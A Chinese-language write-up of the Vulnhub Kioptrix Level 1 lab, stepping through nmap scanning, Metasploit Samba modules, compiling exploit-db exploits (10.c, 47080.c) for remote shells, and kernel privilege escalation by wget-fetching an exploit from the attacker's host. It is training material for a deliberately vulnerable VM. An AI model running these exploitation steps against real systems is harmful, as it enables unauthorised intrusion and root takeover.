Vulnhub - Kioptix Level 1

## 一、前言

### 简介：

Vulnhub是一个提供各种漏洞环境的靶场平台。



### 下载地址：

https://www.vulnhub.com/entry/kioptrix-level-1-1,22/



### 网络问题：

症状：

1、将靶机网络适配器修改为Nat模式后启动靶机，使用nmap对网段进行扫描会发现扫描不到靶机IP地址。

![image-20231226201204026](https://tryhackme.oss-cn-beijing.aliyuncs.com/tryhackme/202312262012051.png)



解决方法：

1、将靶机在VMware中移除。

![image-20231226194201751](https://tryhackme.oss-cn-beijing.aliyuncs.com/tryhackme/202312261942783.png)

2、以记事本打开此文件。![image-20231226194357878](https://tryhackme.oss-cn-beijing.aliyuncs.com/tryhackme/202312261943922.png)

3、删除所有以 **`"ethernet0"`** 开头的条目并保存更改。

![image-20231226195235120](https://tryhackme.oss-cn-beijing.aliyuncs.com/tryhackme/202312261952176.png)

4、 然后重新导入虚拟机，并重新添加虚拟网络适配器且将其网络模式设置为NAT模式。

![image-20231226195659175](https://tryhackme.oss-cn-beijing.aliyuncs.com/tryhackme/202312261956214.png)

5、开启虚拟机，并重新使用nmap对网段进行扫描

![image-20231226200338448](https://tryhackme.oss-cn-beijing.aliyuncs.com/tryhackme/202312262003490.png)



### 参考：

https://www.cnblogs.com/jason-huawen/p/16097208.html



### 靶场环境：

Kali IP：192.168.8.128

靶机 IP：192.168.8.129

网络适配器模式：NAT



## 二、Walkthrough

1、首先使用  **`nmap -sP`**  参数对网段进行扫描，扫描出靶机IP。

![image-20231226200338448](https://tryhackme.oss-cn-beijing.aliyuncs.com/tryhackme/202312262003490.png)

2、扫描出IP后使用  **`nmap -sV`** 参数对靶机进行服务和版本探测。

![image-20231226204743693](https://tryhackme.oss-cn-beijing.aliyuncs.com/tryhackme/202312262047723.png)

3、到这里后有几个思路，对开放端口进行深入信息收集。可以对80和443端口进行访问，看是否可以收集更多信息。（例如：CMS类型和版本、Web服务器类型和版本、操作系统类型和版本、目录扫描、robots.txt文件），如果CMS版本有历史漏洞可以尝试从该点切入。



### Samba

由于Samba的版本nmap没有扫描出来，这里使用 **`msfconsole`** 命令启动MSF，使用MSF自带的smb_version进行搜索。

![image-20231227204750201](https://tryhackme.oss-cn-beijing.aliyuncs.com/tryhackme/202312272047297.png)

搜索到该模块后使用 **`use +序号`** 进行使用模块（这里是 **use0** ）,在使用该模块后使用 **`show options`** 命令查看该模块需要设置的功能点，这里发现RHOSTS 没有设置，将RHOSTS设置为靶机IP地址后，再次使用命令查看是否存在还需要设置的功能点，这里发现已经设置好了直接使用 **`run`** 命令使用模块，Samba版本为 **2.2.1a**。

![image-20231227205147361](https://tryhackme.oss-cn-beijing.aliyuncs.com/tryhackme/202312272051411.png)

已知Samba版本使用`searchsploit samba`搜索到所有包含Samba的exp，这里使用可以远程命令执行的（网上搜的）。

![image-20231228190710699](https://tryhackme.oss-cn-beijing.aliyuncs.com/tryhackme/202312281907798.png)



#### Samba Remote Code Execution（RCE）

exp 文件路径为`/usr/share/exploitdb/exploits/multiple/remote/10.c` 使用`cp`命令将exp复制到合适的位置，我这里是复制到了**`/opt/exp`**文件夹下（需要使用root权限启动终端）。

![image-20231228190952110](https://tryhackme.oss-cn-beijing.aliyuncs.com/tryhackme/202312281909137.png)

 使用`gcc 10.c -o samba_exp`命令编译exp（-o 是输出，后面的是输出的文件名），编译完成后使用`chmod u+x`命令为用户添加执行权限。

![image-20231228191436417](https://tryhackme.oss-cn-beijing.aliyuncs.com/tryhackme/202312281914455.png)

使用`./samba_exp -b0 IP地址 `命令启动（-b 参数是platform，0为Linux），启动成功后成功getshell。

![image-20231228191847644](https://tryhackme.oss-cn-beijing.aliyuncs.com/tryhackme/202312281918674.png)



#### Samba trans2open

在互联网中查找资料后得知还有这种利用方式，而且msf中已经集成了该模块，直接启动msfconsole，使用命令搜索。

![image-20231229070238874](https://tryhackme.oss-cn-beijing.aliyuncs.com/tryhackme/202312290702904.png)

搜索出来后直接使用 **use** 命令来使用并且设置LHOST、RHOSTS、Payload,但是这里遇到一个问题就是有时候会不成功，同一台Kali的另一个msfconsole窗口就可以成功获取shell。

![image-20231229070644032](https://tryhackme.oss-cn-beijing.aliyuncs.com/tryhackme/202312290706087.png)

在另一个窗口中成功getshell，这里已经是root权限不需要提权。

![image-20231229070853181](https://tryhackme.oss-cn-beijing.aliyuncs.com/tryhackme/202312290708214.png)



### rpcbind

111端口为rpcbind服务，该服务存在漏洞(该漏洞可使攻击者在远程rpcbind绑定主机上任意大小的内存(每次攻击最高可达4GB),除非进程崩溃或者管理员挂起/重启rpcbind服务，否则该内存不会被释放)。

nmap扫描已知版本为 **`rpcbind 2`** ,启动MSF 使用searchsploit命令看漏洞库中是否存在该漏洞。

1、使用msf自带的的模块扫描rpcbind，命令为

`use auxiliary/scanner/misc/sunrpc_portmapper`，设置 **RHOSTS**后直接**run**。

![image-20231228194643291](https://tryhackme.oss-cn-beijing.aliyuncs.com/tryhackme/202312281946330.png)

2、由于没找到什么有用信息，这里使用 **`searchsploit rpcbind`**命令搜索一下发现搜索到了三个Exp，把这三个**Exp**都复制下来后挨个使用发现都没有作用。

![image-20231228195256134](https://tryhackme.oss-cn-beijing.aliyuncs.com/tryhackme/202312281952163.png)



26887.rb

![image-20231228195212741](https://tryhackme.oss-cn-beijing.aliyuncs.com/tryhackme/202312281952772.png)



41974.rb

![image-20231228195416676](https://tryhackme.oss-cn-beijing.aliyuncs.com/tryhackme/202312281954709.png)



20376.txt

![image-20231228195507308](https://tryhackme.oss-cn-beijing.aliyuncs.com/tryhackme/202312281955335.png)

里面的网址也都不能访问，所以rpcbind这条路作罢。



### mod_ssl

由于nmap在信息收集的过程中收集到了mod_ssl的版本为2.8.4 ,这里使用命令`searchsploit mod_ssl 2.8`搜索Exp，复制搜索到的Exp到本地进行编译。

![image-20231228201852245](https://tryhackme.oss-cn-beijing.aliyuncs.com/tryhackme/202312282018276.png)



21671.c和764.c编译失败



47080.c

首先使用命令`gcc 47080.c -o 47080`进行编译发现编译失败，一番搜索后在后面添加参数 `-lcrypto`后编译成功，完整命令如下：

```
gcc 47080.c -o 47080 -lcrypto
```

使用命令`./47080`启动编译后的软件给我们了使用方法，在前期信息收集时可以得知操作系统为`Redhat Linux Apache的版本为1.3.20`

![image-20231228204732617](https://tryhackme.oss-cn-beijing.aliyuncs.com/tryhackme/202312282047655.png)

这里使用以下命令成功拿到低权限Shell，但是不知道为什么使用**0x6a**不成功。

```
./47080 0x6b 192.168.8.129(IP地址) 443 -c 50
```

![image-20231228205918440](https://tryhackme.oss-cn-beijing.aliyuncs.com/tryhackme/202312282059474.png)

后面就要考虑提权的问题了，提权的方法有很多，这里使用Linux内核漏洞提权，上面拿到低权限shell后使用`uname -a`命令查看内核版本。

![image-20231228211433421](https://tryhackme.oss-cn-beijing.aliyuncs.com/tryhackme/202312282114442.png)

直接搜索Exp并复制到`/opt/exp`目录下。

![image-20231228211549537](https://tryhackme.oss-cn-beijing.aliyuncs.com/tryhackme/202312282115664.png)

![image-20231228214322941](https://tryhackme.oss-cn-beijing.aliyuncs.com/tryhackme/202312282143966.png)

使用  **`python3 -m http.server`**  命令开开启HTTP服务。

![image-20231228214519952](https://tryhackme.oss-cn-beijing.aliyuncs.com/tryhackme/202312282145978.png)

在低权限shell中使用**`wget 192.168.8.128:8000/3.c`** 命令下载到靶机中，并使用`gcc 3.c -o exp`命令编译，编译后使用命令`./exp`启动，到这里提权成功。

![image-20231228215409847](https://tryhackme.oss-cn-beijing.aliyuncs.com/tryhackme/202312282154882.png)

## 三、总结

1、网络发现可以用netdiscover工具来找到靶机IP。

2、samba扫描工具可以使用以下几个

```
1、msf中的smb_version
2、enum4linux
```

